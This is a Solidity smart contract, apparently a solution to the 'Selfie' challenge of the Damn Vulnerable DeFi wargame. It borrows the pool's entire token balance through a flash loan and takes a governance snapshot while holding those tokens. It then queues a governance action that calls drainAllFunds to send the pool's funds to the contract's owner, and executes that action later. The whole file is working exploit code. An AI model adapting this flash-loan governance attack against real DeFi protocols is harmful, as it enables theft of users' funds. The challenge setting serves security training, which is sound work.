pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

contract Exploitv2 {

    DamnValuableTokenSnapshot public token;
    SimpleGovernance public governance;
    SelfiePool public pool;
    address owner;

    uint256 actionId;

    constructor(address tokenAddress, address governanceAddress, address poolAddress) public {
        token = DamnValuableTokenSnapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
        pool = SelfiePool(poolAddress);
        owner = msg.sender;
    }

    function exploit() external {
        uint256 poolBalance = token.balanceOf(address(pool));
        pool.flashLoan(poolBalance);
        bytes memory data = abi.encodeWithSignature(("drainAllFunds(address)"), address(owner));
        actionId = governance.queueAction(address(pool), data, 0);
    }

    function receiveTokens(address tokenAddress, uint256 borrowAmount) external {
        token.snapshot();
        token.transfer(address(pool), token.balanceOf(address(this)));
    }

    function drainPool() external {
        governance.executeAction(actionId);
    }
}